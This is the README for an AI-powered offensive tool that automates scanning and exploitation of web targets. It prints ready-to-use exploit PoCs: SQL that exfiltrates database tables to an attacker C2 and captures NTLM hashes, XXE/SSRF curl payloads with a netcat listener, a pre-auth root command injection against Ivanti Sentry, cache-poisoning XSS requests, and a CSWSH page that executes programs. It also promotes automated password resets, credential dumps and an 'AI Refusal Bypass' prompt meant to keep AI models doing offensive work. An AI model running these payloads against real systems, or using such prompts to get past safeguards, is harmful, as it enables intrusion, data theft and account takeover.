<div align="center">

<img src="assets/logo.png" width="180" alt="bingo logo"/>

# bingo

**AI-Powered Red Team Terminal**

[![Version](https://img.shields.io/badge/version-2.1.0-brightgreen?logo=github)](https://github.com/bingook/bingo/releases)
[![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/bingook/bingo)
[![Status](https://img.shields.io/badge/status-Official%20Release-brightgreen)](https://github.com/bingook/bingo)

*DeepSeek · Claude · GPT · GLM · Qwen · Ollama · Custom*

> **v2.1.0 — Official Release**  
> Previous versions (≤ 2.0.x) were test/beta releases. v2.1.0 is the first stable, production-ready version.

</div>

---

## What is bingo?

bingo is a hacker-style AI terminal that automates real penetration testing workflows. You type a target URL, and bingo runs a full red team pipeline — WAF detection, vulnerability scanning, SQL injection, file upload exploitation, IDOR enumeration, hash cracking, and auto-generated reports — all powered by the AI model of your choice.

**Zero-Hallucination System** (new in v2.1): Every finding is labeled with an evidence level (`VERIFIED` / `LIKELY` / `INFERRED`). Nothing is discarded — unverified results are flagged separately rather than silently dropped.

---

## Installation

### macOS / Linux

```bash
curl -fsSL https://raw.githubusercontent.com/bingook/bingo/main/install.sh | bash
```

Or clone manually:

```bash
git clone https://github.com/bingook/bingo.git
cd bingo
bash install.sh
```

### Windows

> ⚠️ **Run in PowerShell** (not CMD).  
> Start → search `PowerShell` → **Right-click → Run as Administrator**

**Option 1 — Auto-install (recommended):**
```powershell
irm https://raw.githubusercontent.com/bingook/bingo/main/install.ps1 | iex
```

**Option 2 — If execution policy error:**
```powershell
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
irm https://raw.githubusercontent.com/bingook/bingo/main/install.ps1 | iex
```

**Option 3 — Manual install (most reliable):**
```powershell
git clone https://github.com/bingook/bingo.git $env:USERPROFILE\bingo
cd $env:USERPROFILE\bingo
python -m pip install -e .
python -m bingo
```

**Option 4 — Without git:**
```powershell
Invoke-WebRequest "https://github.com/bingook/bingo/archive/main.zip" -OutFile "$env:TEMP\bingo.zip" -UseBasicParsing
Expand-Archive "$env:TEMP\bingo.zip" "$env:USERPROFILE" -Force
Rename-Item "$env:USERPROFILE\bingo-main" "$env:USERPROFILE\bingo"
cd "$env:USERPROFILE\bingo"
python -m pip install -e .
python -m bingo
```

> **Requirements:** Python 3.10+, PowerShell 5.1+

---

## Quick Start

```bash
bingo                      # Launch interactive terminal
bingo scan https://target.com  # Full automated red team scan
bingo --version            # Show version
bingo --reset              # Reset configuration
```

On first launch: **select language → enter AI model API key → start hacking**.

---

## Core Features

### Zero-Hallucination System (v2.1)

Every finding produced by bingo is assigned an evidence level:

| Level | Meaning | Report placement |
|-------|---------|-----------------|
| `✅ VERIFIED` | HTTP response confirmed (status code + URL + curl) | Main vulnerability list |
| `🟡 LIKELY` | Partial evidence (response pattern + URL) | Main list with annotation |
| `🔍 INFERRED` | No direct proof — reasoning-based | "Needs Investigation" section |
| `🤖 AI_ANALYSIS` | AI analysis text | Separate AI section |

**No finding is ever discarded.** Unverified results are clearly labeled and placed in a dedicated section so you can manually verify them — not silently dropped.

---

### Automated WAF Detection & Bypass

When a target URL is mentioned in chat, bingo automatically:
1. Detects WAF type from HTTP headers and response patterns
2. Identifies the WAF vendor (Cloudflare, AWS WAF, ModSecurity, Wordfence, etc.)
3. Adapts injection payloads with encoding/obfuscation to bypass the WAF
4. Executes all steps as real Python scripts — no external tool required

| WAF | Detection Method |
|-----|-----------------|
| Cloudflare | `cf-ray` header, block page signature |
| AWS WAF | `x-amzn-requestid` header, 403 pattern |
| ModSecurity | Server header, error page content |

---

### Interactive Post-Report Actions (v2.1)

After every report is generated, bingo presents **3–5 numbered next steps**:

```
╭─ Report saved: targets/report_example.com.md ─╮
│ What to do next?                               │
╰────────────────────────────────────────────────╯

  #  Next Options
  ─────────────────────────────────────────────
  1  Run IDOR scan on /api/user?id= endpoints
  2  Attempt IDOR-based password reset
  3  Upload GIF polyglot webshell via /upload
  4  Deep SQLi on login form with sqlmap flags
  5  Check for exposed phpinfo() or .env files

▶ Enter number + Enter (0 = exit, other = type freely)

  > _
```

Enter a number to continue automatically — no need to think about what to do next.

---

### API Discovery & AI-Powered Fuzzing (v2.1)

Inspired by Brutecat's research ("Hacking Google with AI for $500,000"), bingo automatically discovers API documentation and fuzzes every endpoint using AI-guided parameter testing.

**Step 1 — Auto-discover API docs:**

bingo probes 30+ common paths to find machine-readable API specifications:

| Doc type | Paths probed |
|----------|-------------|
| OpenAPI / Swagger | `/swagger.json`, `/openapi.json`, `/v1/api-docs`, `/v3/api-docs`, ... |
| Google Discovery | `/$discovery/rest`, `/discovery/v1/apis` |
| GraphQL | `/graphql`, `/graphiql`, `/api/graphql` |
| WordPress | `/wp-json` |
| Spring Boot | `/actuator/mappings` |

**Step 2 — AI auto-fuzzes every endpoint:**

Once endpoints are found, bingo tests them automatically:
- **Unauthenticated access** — calls every API with no cookies or tokens; `200 OK` = confirmed bypass
- **Parameter fuzzing** — injects IDOR, SQLi, SSTI, and path traversal payloads into query parameters
- **Sensitive keyword detection** — flags responses containing `password`, `token`, `traceback`, SQL error messages, etc.
- **500 error detection** — server errors triggered by payloads indicate possible injection points

**Evidence labeling:**
```
VERIFIED  = real HTTP 200 response with sensitive data confirmed
LIKELY    = suspicious response pattern (500 error, auth keyword)
INFERRED  = structural pattern match only
```

**AI auto-trigger conditions:**
- Always runs (low cost, high discovery value)
- Escalates to fuzzing only when endpoints are actually found

---

### MSSQL 2025 AI Feature Exploitation (v2.1)

> **Research basis:** [SpecterOps — "Oops, I Weaponized the Database: Abusing AI Features in SQL Server 2025"](https://specterops.io/blog/2026/06/10/oops-i-weaponized-the-database-abusing-ai-features-in-mssql-2025/)

SQL Server 2025 introduced native AI capabilities that create entirely new attack surfaces. bingo automatically detects these conditions and generates exploitation PoCs when all three prerequisites are met.

**AI auto-trigger conditions (all three must be confirmed):**

| Condition | How bingo checks |
|-----------|-----------------|
| Target runs SQL Server 2025 | `@@version` injection or version string in error response |
| SQL injection allows stacked queries | `WAITFOR DELAY '0:0:3'` — response delay ≥ 2.5 s = confirmed |
| DB account has elevated privileges | `IS_SRVROLEMEMBER('sysadmin')` time-based check |

If any condition is not met, the module is automatically skipped — no false positives, no impact on other DB engines (MySQL, PostgreSQL, Oracle).

**Exploitation techniques (PoC generation only — not auto-executed):**

| Technique | Attack primitive | Impact |
|-----------|-----------------|--------|
| `sp_invoke_external_rest_endpoint` | POST entire DB tables to attacker server | Full data exfiltration (up to 100 MB) |
| `CREATE EXTERNAL MODEL` (UNC path) | Load model from `\\attacker-ip\share` → NTLM coercion | Admin password hash capture |
| `AI_GENERATE_EMBEDDINGS` (UNC path) | Same UNC trick via embedding model | Covert C2 channel / NTLM relay |

**Generated PoC example:**

```sql
-- Enable REST endpoint
EXEC sp_configure 'external rest endpoint enabled', 1; RECONFIGURE;

-- Exfiltrate users table to attacker server
DECLARE @p NVARCHAR(MAX);
SELECT @p = (SELECT * FROM dbo.users FOR JSON AUTO);
EXEC sp_invoke_external_rest_endpoint
    @url = N'https://YOUR-C2/collect',
    @method = 'POST',
    @payload = @p;

-- NTLM hash coercion via external model
CREATE EXTERNAL MODEL ntlm_bait WITH (
    LOCATION = '\\YOUR-ATTACKER-IP\share',
    API_FORMAT = 'ONNX Runtime',
    MODEL_TYPE = EMBEDDINGS,
    MODEL = 'capture'
);
```

**Evidence labeling:**
```
VERIFIED  = WAITFOR DELAY confirmed stacked query + version string confirmed
LIKELY    = MSSQL error detected but version unconfirmed
INFERRED  = MSSQL fingerprint only, stacked queries not tested
```

**Remediation (auto-included in report):**
1. `EXEC sp_configure 'external rest endpoint enabled', 0; RECONFIGURE;`
2. Block outbound connections from the SQL Server host at the firewall
3. Remove `sysadmin` privilege from the application DB account
4. Apply SQL injection patch (Parameterized Query)

---

### ArubaOS Pre-Auth XXE → OOB SSRF (v2.1)

> **Research basis:** [netacoding.com — "Pre-Authentication XXE → OOB SSRF in ArubaOS 8.x"](https://netacoding.com/posts/xxe-ssrf/)  
> **Severity:** CVSS 9.3 Critical  
> **Disclosed:** Bugcrowd submission 9e946ca3 (closed as "theoretical")

HPE Aruba ArubaOS 8.13.2.0 and earlier expose an **unauthenticated XML management API on port 32000/TCP**. The API processes XML `SYSTEM` entities without authentication, allowing a pre-auth attacker to force the controller to make arbitrary outbound HTTP requests (OOB SSRF) and scan internal network services.

**AI auto-trigger conditions:**

| Condition | How bingo checks |
|-----------|-----------------|
| Port 32000/TCP open | TCP socket connect (3 s timeout) |
| ArubaOS XML API banner | `<dialog>`, `aruba`, `ArubaOS` in HTTP response |
| Automatic on match | No user interaction required |

If port 32000 is not reachable, the module is silently skipped — zero false positives, no impact on other scan modules.

**Attack chain bingo detects:**

| Step | Technique | Evidence level |
|------|-----------|---------------|
| 1 | Port 32000 open confirmation | `VERIFIED` — TCP socket |
| 2 | ArubaOS XML API banner detection | `VERIFIED` — response content match |
| 3 | OOB SSRF callback (with OOB server) | `VERIFIED` — actual HTTP callback received |
| 4 | Timing-based blind XXE (no OOB server) | `LIKELY` — request timeout anomaly |
| 5 | Internal port scan via SSRF | `VERIFIED` — response content differs per port |

**PoC payload (auto-generated in report):**

```xml
<!-- Step 1: Basic OOB SSRF — triggers outbound connection to attacker -->
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY xxe SYSTEM "http://YOUR-SERVER:9999/xxe-probe">
]>
<aruba><opcode>&xxe;</opcode></aruba>
```

```bash
# Full automated curl PoC (generated by bingo in report)
# Step 1: Start listener
nc -lvp 9999

# Step 2: Send XXE payload
curl -s -X POST 'http://TARGET:32000/' \
  -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://YOUR-IP:9999/probe">]><aruba><opcode>&xxe;</opcode></aruba>'

# Step 3: Internal port scan via SSRF
for port in 22 80 443 3306 5432 9200; do
  curl -s -X POST 'http://TARGET:32000/' \
    -H 'Content-Type: text/xml' \
    -d "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY x SYSTEM \"http://127.0.0.1:$port/\">]><aruba><opcode>&x;</opcode></aruba>"
done
```

**Evidence labeling:**
```
VERIFIED  = OOB callback actually received by attacker server
LIKELY    = request timeout anomaly (server attempted external connection)
INFERRED  = port 32000 open + Aruba banner, but XXE not confirmed
```

**Remediation (auto-included in report):**
1. Upgrade ArubaOS to the latest version immediately
2. Block port 32000/TCP from external access at the firewall (management VLAN only)
3. Disable XML External Entity processing in the XML API parser
4. Enforce authentication on all XML API endpoints (AAA profile)
5. Restrict outbound HTTP connections from the controller to a whitelist

---

### OAuth Misconfiguration Chain Attack Detection (v2.1)

> **Research basis:**  
> [Shafayat Ahmed Alif — "Critical OAuth Misconfiguration → Account Takeover"](https://medium.com/@iamshafayat/how-i-found-a-critical-oauth-misconfiguration-that-led-to-account-takeover-abfec43eaea6)  
> [Ali Mojaver — "The Most Dangerous OAuth Bug I've Ever Found"](https://medium.com/@AliMojaver/the-most-dangerous-oauth-bug-ive-ever-found-a2af1275385c)

Two distinct OAuth attack chains auto-detected and combined into a single scanner.

#### Pattern A — Open Registration Chain (Shafayat's 5-step ATO chain)

| Step | Check | Severity |
|------|-------|----------|
| ① | `POST /oauth/register` (no auth) → HTTP 201 + `client_id` returned | High |
| ② | `POST /oauth/authorize` (no session cookie) → HTTP 200/201 + `redirect_uri` | Critical |
| ③ | Token exchange using PKCE only (no `client_secret`) | Medium |
| ④ | `OPTIONS /oauth/token` → `Access-Control-Allow-Origin: *` | Medium |
| Chain | All 4 conditions: full Authorization Code Hijacking → ATO | **Critical** |

#### Pattern B — Unverified Email OAuth Trust (Ali Mojaver's email-trust chain)

| Step | Check | Severity |
|------|-------|----------|
| ① | `POST /auth/register` with arbitrary email → immediate token returned (no verification required) | High |
| ② | Platform serves `/.well-known/oauth-authorization-server` or shows OAuth provider patterns | Medium |
| Chain | ① + ②: Register as `victim@gmail.com` → login as victim on ALL integrated sites | **Critical** |

#### AI Auto-Trigger Conditions
- `/.well-known/oauth-authorization-server` accessible (HTTP 200)
- Response contains `authorization_endpoint` / `token_endpoint` / `client_id=`
- Target URL contains `/oauth/`, `/auth/`, `/connect/`
- Homepage contains OAuth login button patterns

#### Chain Risk Score
- **Pattern A**: 0–5 points (3+ = High, 5 = Critical)
- **Pattern B**: 0–3 points (2+ = Critical — mass ATO risk)
- cURL PoC auto-generated for all confirmed findings

---

### Ivanti Sentry Pre-Auth RCE — CVE-2026-10520 (v2.1)

> **Research basis:** [watchTowr Labs — "Ivanti Sentry Pre-Auth OS Command Injection CVE-2026-10520"](https://labs.watchtowr.com/more-evidence-that-words-dont-mean-what-we-thought-they-meant-ivanti-sentry-pre-auth-os-command-injection-cve-2026-10520/)  
> **Severity:** CVSS 10.0 Critical  
> **Companion:** CVE-2026-10523 — Authentication Bypass (admin account creation)

Ivanti Sentry (formerly MobileIron Sentry) versions before R10.5.2/R10.6.2/R10.7.1 expose an **unauthenticated POST endpoint** that passes user input directly into an internal MICS configuration engine — allowing pre-auth OS command injection as **root**.

**Vulnerable endpoint:**
```
POST /mics/api/v2/sentry/mics-config/handleMessage
```

**AI auto-trigger conditions:**

| Condition | How bingo checks |
|-----------|-----------------|
| Ivanti Sentry product present | `GET /mics/login.jsp` exists (HTTP 200/302) |
| Endpoint reachable without auth | `POST /mics/.../handleMessage` → no 302 redirect |
| Patched version detection | HTTP 302 to login page = patched, skip module |

If none of the conditions match, the module is silently skipped — no impact on other scan phases.

**How the injection works:**

```
message= execute system /configuration/system/commandexec
         <commandexec>
           <index>1</index>
           <reqandres>OS_COMMAND_HERE</reqandres>
         </commandexec>
```

The `message` parameter is parsed as a MICS configuration command → routed to `EXECUTE` handler → `executeNativeCommand()` via Java reflection → **root shell execution**.

**PoC (bingo auto-generates in report):**

```bash
# Confirm RCE — no credentials required
curl -sk -X POST 'https://TARGET/mics/api/v2/sentry/mics-config/handleMessage' \
  -d 'message=execute system /configuration/system/commandexec <commandexec><index>1</index><reqandres>id</reqandres></commandexec>'

# Expected response (VERIFIED evidence):
# {"status":200,"data":"<result><success>uid=0(root) gid=0(root)\n</success></result>"}
```

**Evidence labeling:**

```
VERIFIED  = command output extracted from HTTP response (id / uname -a)
LIKELY    = endpoint accessible (no 302) but no command output confirmed
INFERRED  = /mics/login.jsp exists, endpoint not yet tested
```

**Safe probe mode (default):** bingo only executes read-only commands (`id`, `uname -a`, `hostname`) — no system modifications.

**Affected versions:**

| Version | Status |
|---------|--------|
| < R10.5.2 | **Vulnerable** |
| < R10.6.2 | **Vulnerable** |
| < R10.7.1 | **Vulnerable** |
| R10.5.2+ / R10.6.2+ / R10.7.1+ | Patched |

**Remediation (auto-included in report):**
1. Upgrade Ivanti Sentry to R10.5.2 / R10.6.2 / R10.7.1 immediately
2. Block `/mics/api/v2/sentry/mics-config/handleMessage` at the firewall
3. Restrict Sentry management interface to isolated management VLAN only
4. Apply CVE-2026-10523 patch simultaneously (admin account creation bypass)
5. Review `/mics/` access logs for abnormal POST requests (incident investigation)

---

### Next.js Cache Poisoning → 0-click SXSS (v2.1)

> **Research basis:**  
> [Rachid Allam (zhero;) & inzo\_ — "Re:CACHE - Excessive reflection, type confusion, and 0-click SXSS on Next.js"](https://zhero-web-sec.github.io/research-and-things/re-cache-excessive-reflection-type-confusion-and-0-click-sxss-on-nextjs)  
> Rewarded: **five-figure bug bounty** at a globally recognized company

**Attack chain:**

```
① Request headers reflected in response headers (middleware misconfiguration)
    Request:  Content-Type: text/html
    Response: Content-Type: text/html  ← reflected as-is
    
② Next.js App Router + RSC payload context switch
    GET /dynamic-page?pwn=<xss>  +  Rsc: 1  +  Content-Type: text/html
    → RSC payload served as text/html instead of text/x-component
    → URL params reflected in RSC body after __PAGE__ marker → XSS context
    
③ Cloudflare caches poisoned response (ignores Vary: Rsc)

④ Stage 2: Home page poisoned with Refresh header
    GET /  +  Refresh: 0; /dynamic-page?pwn=<xss>
    → Victim visits homepage → auto-redirected → XSS fires
    
⑤ Zero-click: no user interaction required
```

**AI auto-trigger conditions** (bingo runs this automatically):

| Condition | Detection method |
|-----------|-----------------|
| `x-powered-by: Next.js` | HTTP response header |
| `_next/static` or `__NEXT_DATA__` in body | HTML body scan |
| `cf-cache-status` header present | Cloudflare detection |
| RSC response changes with `Rsc: 1` header | Active probe |

**Finding types and evidence levels:**

| Finding | Evidence Level | Severity |
|---------|---------------|----------|
| `nextjs_detected` | `VERIFIED` | Info |
| `cache_layer` | `VERIFIED` (cf-cache-status header) | Medium |
| `header_reflection` | `VERIFIED` (Content-Type changes) | High |
| `rsc_dynamic_page` | `VERIFIED` (HTTP 200 + x-component) | Medium |
| `content_type_injection` | `VERIFIED` (response CT = text/html) | High |
| `param_reflected_in_rsc` | `VERIFIED` (marker in body) | Critical |
| `cache_sxss_chain` | `VERIFIED`/`LIKELY` | Critical |

**Auto-generated PoC:**

```bash
# Stage 1: Poison dynamic page
curl -sk 'https://target.com/about?pwn=<img src=x onerror=alert(1)>' \
  -H 'Rsc: 1' \
  -H 'Content-Type: text/html' -D -

# Stage 2: Poison homepage with Refresh redirect
curl -sk 'https://target.com/' \
  -H 'Refresh: 0; https://target.com/about?pwn=<img src=x onerror=alert(1)>' \
  -D -

# Result: victim visits https://target.com/ → XSS fires automatically
```

**Vulnerable conditions (all must be true for full chain):**

1. Next.js App Router (not Pages Router)
2. Middleware forwards request headers to response headers
3. External cache layer (Cloudflare, CDN) that ignores `Vary: Rsc`
4. Dynamic pages with URL parameter → RSC body reflection

**Remediation (auto-included in report):**
1. **Remove header forwarding** in middleware — never pass request `Content-Type` to response
2. Force `Content-Type: text/x-component` for all RSC responses (non-overridable)
3. Exclude RSC paths from CDN caching (`Cache-Control: no-store`)
4. HTML-encode all URL parameters before including in RSC payload
5. Upgrade to Next.js 14.2.32+ / 15.4.7+

---

### CSWSH + EXE Exposure + Localhost WebSocket RCE Chain (v2.1)

> **Research basis:**  
> [Yashar Shahinzadeh / Voorivex Team — "First RCE via Reverse Engineering with AI"](https://blog.voorivex.team/first-rce-via-reverse-engineering-with-ai)  
> Similar prior art: Tavis Ormandy (Electrum WebSocket RCE, 2018)

**Attack chain:**

```
① EXE download path extracted from JS → file accessible without auth
② JS contains ws://127.0.0.1:PORT → desktop app runs local WebSocket server
③ WebSocket has no Origin header validation → CSWSH (Cross-Site WebSocket Hijacking)
④ WebSocket exposes RCE gadget: {RUN: "DRIVE", URL: "calc.exe"}
    └── Service falls through to explorer.exe ShellExecute → OS-level code execution
⑤ Zero-click: victim visits attacker page → instant RCE
```

**AI auto-trigger conditions** (bingo runs this scan automatically):

| Condition | Detection method |
|-----------|-----------------|
| `ws://127.0.0.1:PORT` in JS files | JS static analysis |
| EXE download function in JS (`downSetup`, `down=service`) | Regex pattern match |
| `Content-Type: application/octet-stream` response | HTTP probe |
| `download/setup/install` JS functions | Keyword scan |

**Finding types and evidence levels:**

| Finding | Evidence Level | Severity |
|---------|---------------|----------|
| `js_exe_download` | `LIKELY` | Medium |
| `js_localhost_websocket` | `LIKELY` | High |
| `cswsh_port_open` | `VERIFIED` (TCP connect) | Critical |
| `exe_exposed` | `VERIFIED` (HTTP 200 + octet-stream) | High |
| `cswsh_rce_chain` | `LIKELY`/`VERIFIED` | Critical |

**Auto-generated PoC:**

```html
<!-- CSWSH PoC — victim opens this page → RCE triggers automatically -->
<script>
var ws = new WebSocket('ws://127.0.0.1:PORT');
ws.onopen = function() {
  ws.send(JSON.stringify({GET: 'VERSION'}));             // confirm service
  ws.send(JSON.stringify({RUN: 'DRIVE', URL: 'calc.exe'})); // RCE gadget
};
</script>
```

> **Note (Zero-Hallucination):**  
> Server-side scanners cannot connect to `ws://127.0.0.1` — JS pattern detection is `LIKELY`.  
> TCP port open = `VERIFIED`. Browser-based PoC required for final confirmation.

**Remediation (auto-included in report):**
1. Implement Origin header validation in localhost WebSocket server — whitelist approach
2. Remove file/process execution methods from WebSocket API (`RUN/DRIVE`, `RUN/APP`)
3. Add authentication token requirement to WebSocket handshake
4. Require authentication for EXE download endpoints (signed URLs or session check)
5. Replace `explorer.exe` ShellExecute fallback with strict path whitelist

---

### ACPV — Client-Side Authentication Bypass (v2.1)

bingo automatically detects and exploits client-side authentication vulnerabilities — no password needed.

**How it works:**

Many sites store authentication state in the browser (`localStorage`, `sessionStorage`) and never verify it server-side. bingo finds and exploits this pattern automatically.

| Step | What bingo does |
|------|----------------|
| 1 | Collects all JS files from the target and scans for auth-related patterns (`isLoggedIn`, `token`, `userRole`, etc.) |
| 2 | Tests API endpoints without any cookies or tokens — if the server responds 200, it's an unauthenticated API |
| 3 | Identifies Burp Suite response manipulation points (`"isActive":false`, `"role":"user"`, etc.) |
| 4 | Auto-generates browser console PoC — paste and run, no tools needed |

**Example PoC output:**
```javascript
// bingo auto-generated PoC — paste into browser DevTools console
localStorage.setItem('isLoggedIn', 'true');
localStorage.setItem('userRole', 'admin');
localStorage.setItem('token', 'bypass_acpv');
location.reload();
```

**AI auto-trigger conditions:**
- Admin login fails (no password → try client-side bypass)
- No SQLi vulnerability found (pivot to client-side attack)
- React / Vue / Angular site detected (JS-heavy apps are most vulnerable)

**Zero-Hallucination:** Actual HTTP responses are labeled `VERIFIED`. Pattern matches without server confirmation are labeled `LIKELY`. Nothing is fabricated.

---

### IDOR / Authorization Bypass Phase

Based on real-world exploitation experience:

- Scans for insecure direct object references (`?id=`, `?no=`, `?user_id=`)
- Detects PII exposure (resident number, bank account, phone numbers)
- Checks for unauthenticated admin panel access
- Probes `phpinfo()` and sensitive file exposure
- **IDOR-based password reset** — resets credentials via vulnerable endpoints and verifies actual login success
- All findings tagged with evidence level

---

### Hash Cracking — Fully Automated

When password hashes appear in AI responses, bingo automatically triggers a crack pipeline:

**Step 1 — Online Lookup** (fast, no GPU needed):

| Site | Notes |
|------|-------|
| CrackStation | Largest free DB |
| hashes.com | Multi-algorithm |
| md5decrypt.net | MD5 specialist |
| nivaura.com | SHA-1 / MD5 |
| cmd5.org | Asia-friendly |

**Step 2 — Offline Crack** (if online fails):
- `john` (John the Ripper)
- `hashcat` (GPU-accelerated, bcrypt)
- Python wordlist engine (rockyou.txt auto-detected)

Supported: `bcrypt`, `MD5`, `SHA-1`, `SHA-256`, `SHA-512`, `NTLM`, `MySQL41`

---

### External Tool Auto-Install & Python Fallback

bingo manages all external tools automatically — no manual setup required.

**Tool execution priority:**

| Step | Action |
|------|--------|
| 1 | Use `~/.bingo/tools/` or system PATH |
| 2 | **Auto-install** (GitHub Releases / brew / apt) |
| 3 | **AI-generated Python** — AI writes the tool itself; workflow never stops |

**Go binary tools** (auto-downloaded from GitHub Releases → `~/.bingo/tools/`):

| Tool | Purpose |
|------|---------|
| `nuclei` | Vulnerability scanning |
| `httpx` | HTTP probing & tech detection |
| `ffuf` | Directory & parameter fuzzing |
| `gobuster` | Directory brute-force |
| `subfinder` | Subdomain enumeration |
| `amass` | Attack surface mapping |

**Package manager tools** (brew / apt / yum auto-install):

| Tool | Purpose | Fallback |
|------|---------|---------|
| `nmap` | Port scan | AI writes Python socket scan |
| `nikto` | Web vuln scan | AI writes Python vuln check |
| `whatweb` | Tech fingerprint | bingo http_probe |

---

### Session Auto-Save

Every chat session is automatically saved to:
```
~/.config/bingo/sessions/session_YYYYMMDD_HHMMSS.md
```
Full AI responses, commands, and results are logged in real time.

---

### Skill Engine

220+ red team skills across 41 modules — automatically injected into AI context based on your input. Use `/skill <keyword>` to search.

**Modules include:** Reconnaissance, Exploitation, Privilege Escalation, Post-Exploitation, Lateral Movement, Persistence, Cloud Security, Mobile Security, LLM/AI Security, Blockchain/Web3, Ransomware Defense, **Client-Side Auth Bypass (ACPV)**, **API Discovery & AI Fuzzing**, **MSSQL 2025 AI Exploitation**, and more.

---

### AI Refusal Bypass

All models (DeepSeek, Claude, GPT, GLM) are guided by a proprietary universal system prompt that enforces:
- Structured task execution with semantic delimiters
- OODA-loop decision making (Observe → Orient → Decide → Act)
- Anti-laziness enforcement — explicit evidence required at every step
- 5-phase red team pipeline with intel accumulation and coverage tracking

---

## Commands

Type `/` in chat to open an interactive command menu (arrow keys to navigate).

| Command | Description |
|---------|-------------|
| `/scan <url>` | Full red team pipeline: WAF + fingerprint + vuln + report |
| `/waf <url>` | AI-driven WAF detection + bypass |
| `/crack [hash]` | Hash crack — online lookup → offline crack |
| `/stop` | Stop running crack / scan |
| `/tools` | Show all tools + auto-install missing ones |
| `/tools install <name>` | Install a specific tool automatically |
| `/tools install all` | Install all missing tools at once |
| `/model` | Add or switch AI model |
| `/skill <keyword>` | Search 220+ skill knowledge base |
| `/history` | View conversation history |
| `/export` | Save conversation as `.md` file |
| `/config` | View current settings |
| `/lang` | Change language (ko / zh / en) |
| `/clear` | Clear screen |
| `/quit` | Exit |

### `/tools` Usage

```bash
/tools                       # Show all tools — installed / missing / type
/tools install nmap          # Auto-install nmap via brew/apt
/tools install nuclei ffuf   # Auto-install multiple tools from GitHub Releases
/tools install all           # Auto-install every missing tool at once
```

### `/crack` Usage

```bash
/crack                             # Auto-extract hashes from last AI response
/crack $2y$10$Eix...               # Crack a specific hash
/crack -w ~/Downloads/rockyou.txt  # Use custom wordlist
```

### `bingo scan` Full Pipeline

```bash
bingo scan https://target.com
```

Runs the full 5-phase red team pipeline:
1. **Recon** — tech fingerprint, WAF detection, endpoint mapping
2. **Collect** — sensitive files, admin panels, parameter discovery
3. **Test** — SQLi, LFI, XSS, SSRF, IDOR probing (AI writes Python probes)
4. **Exploit** — WAF bypass + data extraction + credential dump
5. **Report** — auto-generated markdown report with evidence levels

---

## Supported Models

| Provider | Default Model | API |
|----------|--------------|-----|
| **DeepSeek** | `deepseek-chat` | [platform.deepseek.com](https://platform.deepseek.com) |
| **Anthropic Claude** | `claude-opus-4-5` | [console.anthropic.com](https://console.anthropic.com) |
| **OpenAI GPT** | `gpt-4o` | [platform.openai.com](https://platform.openai.com) |
| **Zhipu GLM** | `glm-4` | [open.bigmodel.cn](https://open.bigmodel.cn) |
| **Alibaba Qwen** | `qwen-turbo` | [dashscope.aliyuncs.com](https://dashscope.aliyuncs.com) |
| **Ollama** (local) | `llama3` | [ollama.com](https://ollama.com) |
| **Custom** | — | Enter Base URL manually |

Switch models anytime with `/model`.

---

## Languages

| Language | Code |
|----------|------|
| 한국어 | `ko` |
| 中文 | `zh` |
| English | `en` |

---

## Data Storage

| Data | Location | Trigger |
|------|----------|---------|
| Chat sessions | `~/.config/bingo/sessions/session_*.md` | Auto (real-time) |
| Scan reports | `targets/report_<domain>.md` | Auto on `bingo scan` |
| Command history | `~/.config/bingo/history` | Auto |
| Manual export | `./bingo_chat_<timestamp>.md` | `/export` command |
| Config | `~/.config/bingo/config.json` | Auto |
| Go tools | `~/.bingo/tools/` | Auto on first use |

---

## Config File Location

| OS | Path |
|----|------|
| macOS | `~/Library/Application Support/bingo/config.json` |
| Linux | `~/.config/bingo/config.json` |
| Windows | `%APPDATA%\bingo\config.json` |

---

## Project Structure

```
bingo/
├── bingo/
│   ├── cli.py                    # Entry point + onboarding
│   ├── config.py                 # Settings (cross-platform)
│   ├── models/
│   │   ├── base.py               # Streaming HTTP (OpenAI-compatible + Claude)
│   │   ├── registry.py           # Provider registry
│   │   └── system_prompt.py      # Universal pentest system prompt
│   ├── tools/
│   │   ├── registry.py           # Tool detection (~/.bingo/tools/ + PATH + vendor)
│   │   ├── executor.py           # 4-step: vendor → PATH → auto-install → Python fallback
│   │   ├── downloader.py         # Go binary auto-download from GitHub Releases
│   │   ├── installer.py          # brew / apt / pip auto-install
│   │   ├── http_probe.py         # HTTP fingerprinting
│   │   ├── hash_crack.py         # Offline hash cracker (bcrypt/MD5/SHA/NTLM)
│   │   ├── hash_lookup.py        # Online hash lookup (CrackStation, hashes.com, etc.)
│   │   └── idor_scanner.py       # IDOR/auth-bypass scanner + password reset
│   ├── redteam/
│   │   ├── session.py            # Red team session state + evidence-level tagging
│   │   └── phases/               # 9-phase pipeline (recon → report)
│   ├── core/
│   │   └── anti_hallucination.py # Zero-Hallucination engine (VERIFIED/LIKELY/INFERRED)
│   ├── skills/
│   │   └── engine.py             # 220+ skills across 39 modules (ko/zh/en)
│   ├── ui/
│   │   └── terminal.py           # Interactive terminal (slash menu, live stream, post-report actions)
│   └── lang/
│       └── strings.py            # Multi-language string registry
├── install.sh                    # macOS/Linux installer
├── install.ps1                   # Windows installer
└── pyproject.toml
```

---

## Changelog

### v2.1.0 — Official Release *(2026-06)*
- **Zero-Hallucination System** — all findings labeled `VERIFIED` / `LIKELY` / `INFERRED` / `AI_ANALYSIS`; nothing discarded
- **Interactive Post-Report Actions** — 3–5 numbered next steps auto-presented after every report; enter a number to continue
- **ACPV — Client-Side Auth Bypass** — AI auto-detects JS-based auth (localStorage/sessionStorage), tests unauthenticated APIs, generates browser console PoC automatically
- **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
- **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
- **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
- **47 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47)
- Production-stable (`Development Status :: 5 - Production/Stable`)

### v2.0.x — Beta
- Initial public release
- 5-phase red team pipeline
- WAF bypass, hash cracking, tool auto-install
